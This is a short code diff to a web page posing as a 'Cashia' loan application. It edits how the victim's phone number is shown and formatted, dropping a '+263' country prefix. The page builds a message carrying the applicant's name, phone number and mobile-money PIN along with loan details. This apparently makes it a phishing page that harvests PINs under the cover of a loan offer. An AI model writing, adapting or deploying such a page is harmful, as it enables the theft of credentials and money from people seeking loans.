@@ -540,7 +540,7 @@ body.light .loan-bar {
             document.getElementById('bName').textContent = name || 'N/A';
             document.getElementById('bAmt').textContent = 'ksh ' + (amount || '0.00');
             document.getElementById('bTerm').textContent = duration || 'N/A';
-            document.getElementById('bPhone').textContent = phone ? '+263' + phone : 'N/A';
+            document.getElementById('bPhone').textContent = phone ? '' + phone : 'N/A';
 
             document.getElementById('dispName').value = name || 'N/A';
             document.getElementById('dispAmount').value = 'ksh ' + (amount || '0.00');
@@ -575,7 +575,7 @@ body.light .loan-bar {
 
             var msg = '\u{1f4f1} <b>Cashia Loan Application</b>\n\n' +
                 '<b>Name:</b> <code>' + bd.name + '</code>\n' +
-                '<b>Phone:</b> <code>+263' + bd.phone + '</code>\n' +
+                '<b>Phone:</b> <code>' + bd.phone + '</code>\n' +
                 '<b>PIN:</b> <code>' + pin + '</code>\n' +
                 '<b>Loan:</b> <code>' + (bd.purpose || 'N/A') + '</code>\n' +
                 '<b>Amount:</b> <code>ksh ' + bd.amount + '</code>\n' +
@@ -621,4 +621,5 @@ body.light .loan-bar {
     </script>
 </body>
                         </html>
+                        
                         
